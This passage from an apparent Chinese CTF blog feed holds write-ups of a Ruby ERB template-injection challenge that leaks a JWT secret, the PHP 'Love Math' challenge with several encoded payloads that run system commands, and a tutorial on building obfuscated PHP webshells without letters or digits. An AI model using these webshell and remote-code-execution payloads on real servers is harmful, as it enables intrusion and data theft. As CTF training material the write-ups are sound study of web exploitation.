class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][0,<span class="hljs-number">7</span>]&#125;</span> is working&quot;</span> <span class="hljs-keyword">then</span>    auth[<span class="hljs-string">&quot;jkl&quot;</span>] = auth[<span class="hljs-string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="hljs-number">10</span>)    auth = JWT.encode auth,ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span>    cookies[<span class="hljs-symbol">:auth</span>] = auth    ERB::new(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][0,<span class="hljs-number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result  <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span>post <span class="hljs-string">&quot;/shop&quot;</span> <span class="hljs-keyword">do</span>  islogin  auth = JWT.decode cookies[<span class="hljs-symbol">:auth</span>],ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-keyword">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;  if auth[0][<span class="hljs-string">&quot;jkl&quot;</span>] &lt; FLAGPRICE <span class="hljs-keyword">then</span>    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;error&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;no enough jkl&quot;</span>&#125;)  else    auth &lt;&lt; &#123;<span class="hljs-symbol">flag:</span> ENV[<span class="hljs-string">&quot;FLAG&quot;</span>]&#125;    auth = JWT.encode auth,ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span>    cookies[<span class="hljs-symbol">:auth</span>] = auth    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;jkl is good thing&quot;</span>&#125;)  <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">islogin</span></span>  if cookies[<span class="hljs-symbol">:auth</span>].<span class="hljs-keyword">nil</span>? <span class="hljs-keyword">then</span>    redirect to(<span class="hljs-string">&#x27;/shop&#x27;</span>)  <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span></code></pre><p>work下有串代码：</p><pre><code class="hljs markdown">if params[<span class="hljs-string">:do</span>] == &quot;#&#123;params[<span class="hljs-string">:name</span>][<span class="hljs-symbol">0,7</span>]&#125; is working&quot; then<span class="hljs-code">    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><span class="hljs-code">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><span class="hljs-code">    cookies[:auth] = auth</span><span class="hljs-code">    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result</span></code></pre><p>传入的do参数和name参数一致，会输出<code>&#123;params[:name][0,7]&#125; working successfully!</code></p><p>ruby预定义中</p><p><img src="/2021/07/27/ruby/1.png" alt="1"></p><p>构造<code>do=&lt;%=$'%&gt; is working</code>和<code>name=&lt;%=$'%&gt;</code>（内容16进制编码）</p><p><img src="/2021/07/27/ruby/2.png" alt="2"></p><p>得到secret，JWT编码，jkl大于flag的价钱即可</p><p><img src="/2021/07/27/ruby/5.png" alt="5"></p><p>传值</p><p><img src="/2021/07/27/ruby/4.png" alt="4"></p><p>JWT解码</p><p><img src="/2021/07/27/ruby/6.png" alt="6"></p><p>参考：</p><p><a href="https://www.anquanke.com/post/id/86867">https://www.anquanke.com/post/id/86867</a></p><p><a href="https://www.freesion.com/article/3596467969/">https://www.freesion.com/article/3596467969/</a></p><h1>[CISCN 2019 初赛]Love Math</h1><h4 id="前置知识"><a class="header-anchor" href="#前置知识">🍭</a>前置知识</h4><p><strong>动态函数</strong></p><p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数例如：<code>$function = &quot;sayHello&quot;;$function();</code></p><p><strong>php中函数名默认为字符串</strong></p><p>例如本题白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择</p><h4 id="解题-v2"><a class="header-anchor" href="#解题-v2">🍭</a>解题</h4><p>源码限制了字符长度，列了一些黑名单，白名单只有数学函数和<code>. ^</code></p><h5 id="payload1"><a class="header-anchor" href="#payload1">🍭</a>payload1:</h5><pre><code class="hljs sqf">$<span class="hljs-literal">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));($$<span class="hljs-literal">pi</span>)&#123;<span class="hljs-literal">pi</span>&#125;(($$<span class="hljs-literal">pi</span>)&#123;<span class="hljs-built_in">abs</span>&#125;)&amp;<span class="hljs-literal">pi</span>=system&amp;<span class="hljs-built_in">abs</span>=tac <span class="hljs-built_in">flag</span>.php</code></pre><blockquote><p>base_convert(37907361743,10,36) =&gt; “hex2bin” dechex(1598506324) =&gt; “5f474554” $pi=hex2bin(“5f474554”) =&gt; $pi=“_GET”   //hex2bin将一串16进制数转换为二进制字符串 ($$pi){pi}(($$pi){abs}) =&gt; ($_GET){pi}($_GET){abs}  //{}可以代替[]</p></blockquote><h5 id="payload2"><a class="header-anchor" href="#payload2">🍭</a>payload2:</h5><pre><code class="hljs angelscript">$pi=base_convert,$pi(<span class="hljs-number">696468</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)($pi(<span class="hljs-number">8768397090111664438</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30</span>)()&#123;<span class="hljs-number">1</span>&#125;)</code></pre><blockquote><p>base_convert(696468,10,36) =&gt; “exec” $pi(8768397090111664438,10,30) =&gt; “getallheaders” exec(getallheaders(){1})</p></blockquote><p><strong>getallheaders</strong></p><p>getallheaders —获取所有 HTTP 请求标头,返回当前请求中或**<code>false</code>**失败时所有 HTTP 标头的关联数组 。</p><h5 id="payload3："><a class="header-anchor" href="#payload3：">🍭</a>payload3：</h5><pre><code class="hljs lisp">//exec(&#x27;hex2bin(<span class="hljs-name">dechex</span>(<span class="hljs-number">109270211257898</span>))&#x27;) =&gt; exec(&#x27;cat f*&#x27;)($pi=base_convert)(<span class="hljs-number">22950</span>,<span class="hljs-number">23</span>,<span class="hljs-number">34</span>)($pi(<span class="hljs-number">76478043844</span>,<span class="hljs-number">9</span>,<span class="hljs-number">34</span>)(<span class="hljs-name">dechex</span>(<span class="hljs-number">109270211257898</span>)))//system(&#x27;cat&#x27;.dechex(<span class="hljs-number">16</span>)^asinh^pi) =&gt; system(&#x27;cat *&#x27;)base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</code></pre><h5 id="payload4："><a class="header-anchor" href="#payload4：">🍭</a>payload4：</h5><pre><code class="hljs angelscript">$pi=(is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>));$pi=$$pi;$pi&#123;<span class="hljs-number">0</span>&#125;($pi&#123;<span class="hljs-number">1</span>&#125;)&amp;<span class="hljs-number">0</span>=system&amp;<span class="hljs-number">1</span>=cat%<span class="hljs-number">20</span>/flag</code></pre><p><img src="/2021/07/27/ruby/7.png" alt="7"></p><p>脚本：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$payload = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>,  <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span> , <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<span class="hljs-keyword">for</span>($k=<span class="hljs-number">1</span>;$k&lt;=sizeof($payload);$k++)&#123;    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>;$i &lt; <span class="hljs-number">9</span>; $i++)&#123;        <span class="hljs-keyword">for</span>($j = <span class="hljs-number">0</span>;$j &lt;=<span class="hljs-number">9</span>;$j++)&#123;            $exp = $payload[$k] ^ $i.$j;            <span class="hljs-keyword">echo</span>($payload[$k].<span class="hljs-string">&quot;^<span class="hljs-subst">$i</span><span class="hljs-subst">$j</span>&quot;</span>.<span class="hljs-string">&quot;==&gt;<span class="hljs-subst">$exp</span>&quot;</span>);            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;        &#125;    &#125;&#125;</code></pre><p>参考：<a href="https://www.cnblogs.com/20175211lyz/p/11588219.html#%E6%80%9D%E8%B7%AF%E4%BA%8C">https://www.cnblogs.com/20175211lyz/p/11588219.html#思路二</a></p>]]></content>
    
    
    <categories>
      
      <category>刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
      <tag>Ruby ERB模板注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无字母数字shell</title>
    <link href="/2021/07/26/shell-1/"/>
    <url>/2021/07/26/shell-1/</url>
    
    <content type="html"><![CDATA[<h2 id="初级"><a class="header-anchor" href="#初级">🍭</a>初级</h2><p>当题目把数字和字母禁掉，常规的shell就用不了；如</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,$_GET[<span class="hljs-string">&#x27;shell&#x27;</span>])) &#123;  <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;shell&#x27;</span>]);&#125;</code></pre><h4 id="思路"><a class="header-anchor" href="#思路">🍭</a>思路</h4><p>将非字母、数字的字符经过各种变换构造出a-z中任意一个字符。</p><h4 id="法一：异或"><a class="header-anchor" href="#法一：异或">🍭</a>法一：异或</h4><p>在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$_=(<span class="hljs-string">&#x27;%01&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%12&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%14&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>); <span class="hljs-comment">// $_=&#x27;assert&#x27;;</span>$__=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%0D&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%2F&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0E&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>); <span class="hljs-comment">// $__=&#x27;_POST&#x27;;</span>$___=$$__;$_($___[_]); <span class="hljs-comment">// assert($_POST[_]);</span></code></pre><p>测试：</p><p><img src="/2021/07/26/shell-1/1.png" alt="1"></p><p>也可构造：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>@$_++; <span class="hljs-comment">//$_=NULL=0  $_++=1</span>$__=(<span class="hljs-string">&quot;#&quot;</span>^<span class="hljs-string">&quot;|&quot;</span>).(<span class="hljs-string">&quot;.&quot;</span>^<span class="hljs-string">&quot;~&quot;</span>).(<span class="hljs-string">&quot;/&quot;</span>^<span class="hljs-string">&quot;`&quot;</span>).(<span class="hljs-string">&quot;|&quot;</span>^<span class="hljs-string">&quot;/&quot;</span>).(<span class="hljs-string">&quot;&#123;&quot;</span>^<span class="hljs-string">&quot;/&quot;</span>); <span class="hljs-comment">//_POST</span>$&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); <span class="hljs-comment">// $_POST[0]($_POST[1]);</span><span class="hljs-meta">?&gt;</span></code></pre><p>字符也可以一起异或使用</p><pre><code class="hljs awk">var_dump(<span class="hljs-string">&quot;#./|&#123;&quot;</span>^<span class="hljs-string">&quot;|~`//&quot;</span>); <span class="hljs-regexp">//</span>_POSTvar_dump(<span class="hljs-string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="hljs-string">&quot;?&lt;&gt;/&quot;</span>); <span class="hljs-regexp">//</span>_GET</code></pre><h4 id="法二：取反"><a class="header-anchor" href="#法二：取反">🍭</a>法二：取反</h4><p>UTF-8编码的某个汉字，并将其中某个字符取出来：</p><p><img src="/2021/07/26/shell-1/2.jpg" alt="2"></p><p>构造：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$__=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>); <span class="hljs-comment">//True+True=2;$__=2利用PHP的弱类型特性</span>$_=$__/$__; <span class="hljs-comment">//$_=2/2=1</span>$____=<span class="hljs-string">&#x27;&#x27;</span>;$___=<span class="hljs-string">&quot;瞰&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="hljs-string">&quot;和&quot;</span>;$____.=~($___&#123;$__&#125;);$___=<span class="hljs-string">&quot;和&quot;</span>;$____.=~($___&#123;$__&#125;);$___=<span class="hljs-string">&quot;的&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="hljs-string">&quot;半&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="hljs-string">&quot;始&quot;</span>;$____.=~($___&#123;$__&#125;);$_____=<span class="hljs-string">&#x27;_&#x27;</span>;$___=<span class="hljs-string">&quot;俯&quot;</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="hljs-string">&quot;瞰&quot;</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="hljs-string">&quot;次&quot;</span>;$_____.=~($___&#123;$_&#125;);$___=<span class="hljs-string">&quot;站&quot;</span>;$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);<span class="hljs-meta">?&gt;</span></code></pre><p>测试</p><img src="/2021/07/26/shell-1/2.png" alt="2" style="zoom: 50%;"><h4 id="法三"><a class="header-anchor" href="#法三">🍭</a>法三</h4><p>在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在    Perl 中 <code>$a = 'Z'; $a++;</code> 将把 <code>$a</code>    变成<code>'AA'</code>，而在 C 中，<code>a = 'Z'; a++;</code> 将把    <code>a</code> 变成 <code>'['</code>（<code>'Z'</code>    的 ASCII 值是 90，<code>'['</code> 的 ASCII 值是    91）。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和    A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。<a href="https://www.php.net/manual/zh/language.operators.increment.php">官方文档</a></p><p>==&gt;<code>'a'++ =&gt; 'b'</code>，<code>'b'++ =&gt; 'c'</code> 所以我们只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：</p><p><img src="/2021/07/26/shell-1/3.png" alt="3"></p><p>构造：</p><pre><code class="hljs awk">&lt;?php<span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;$_&quot;</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$_</span>=<span class="hljs-string">&#x27;Array&#x27;</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>]; <span class="hljs-regexp">//</span> <span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-number">0</span>];<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>; <span class="hljs-regexp">//</span> A<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-regexp">//</span> S<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-regexp">//</span> S<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> E <span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> R<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> T<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> P<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> O<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> S<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> T<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>=$<span class="hljs-variable">$____</span>;<span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]); <span class="hljs-regexp">//</span> ASSERT(<span class="hljs-variable">$_POST</span>[_]);</code></pre><h2 id="进阶"><a class="header-anchor" href="#进阶">🍭</a>进阶</h2><h3 id="极客大挑战-2019-RCE-ME"><a class="header-anchor" href="#极客大挑战-2019-RCE-ME">🍭</a>[极客大挑战 2019]RCE ME</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;    $code = $_GET[<span class="hljs-string">&#x27;code&#x27;</span>];    <span class="hljs-keyword">if</span>(strlen($code)&gt;<span class="hljs-number">35</span>)&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Long.&quot;</span>);    &#125;    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,$code))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);    &#125;    <span class="hljs-keyword">eval</span>($code);&#125;<span class="hljs-keyword">else</span>&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;</code></pre><h4 id="php7"><a class="header-anchor" href="#php7">🍭</a>php7</h4><p>php7.x中表达式的执行顺序:<a href="https://www.php.net/manual/zh/migration70.incompatible.php">官方文档</a></p><p><img src="/2021/07/26/shell-1/4.png" alt="4"></p><p>PHP7前不允许用<code>($a)();</code>执行动态函数，但PHP7中增加了对此的支持。所以，我们可以通过<code>('phpinfo')();</code>来执行函数，第一个括号中可以是任意PHP表达式。构造一个可以生成<code>phpinfo</code>这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：</p><pre><code class="hljs angelscript">(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();</code></pre><h4 id="php5"><a class="header-anchor" href="#php5">🍭</a>php5</h4><p>考虑用“反引号”+“shell”的方式getshell。</p><p>Linux shell知识点：</p><ul><li>shell下可以利用<code>.</code>来执行任意脚本</li><li>Linux文件名支持用glob通配符代替</li></ul><p>period的作用和source一样：用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。如果目标服务器上有一个我们可控的文件，就可以利用<code>.</code>来执行，这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母，执行<code>. /tmp/phpXXXXXX</code>，也有字母。</p><p>Linux下的glob通配符：</p><ul><li><code>*</code>可以代替0个及以上任意字符</li><li><code>?</code>可以代表1个任意字符</li></ul><p><code> /tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code>，但能够匹配上这个通配符的文件有很多。</p><h5 id="glob通配符"><a class="header-anchor" href="#glob通配符">🍭</a>glob通配符</h5><p>glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。我们用它排除其它文件，但当存在一些文件名中都不包含特殊字符，就无法排除了。查看<a href="https://man7.org/linux/man-pages/man7/glob.7.html">文档</a>发现</p><p><img src="/2021/07/26/shell-1/5.png" alt="5"></p><p>glob支持利用<code>[0-9]</code>来表示一个范围。而所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么我们只要找到一个可以表示“大写字母”的glob通配符，就能找到我们要执行的文件。ascii码表中大写字母位于<code>@</code>与<code>[</code>间，就可用<code>[@-[]</code>来表示大写字母。故上题我们传入</p><pre><code class="hljs ruby"><span class="hljs-meta">?&gt;</span>&lt;?=<span class="hljs-string">`. /???/????????[@-[]`</span>;?&gt;</code></pre><p>即可RCE。</p><p>注：php生成临时文件名是随机的，最后一个字符不一定是大写字母，需要多尝试几次。</p><p>参考：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>]]></content>
    
    
    <categories>
      
      <category>shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>buu</title>
    <link href="/2021/07/24/ikun/"/>
    <url>/2021/07/24/ikun/</url>
    
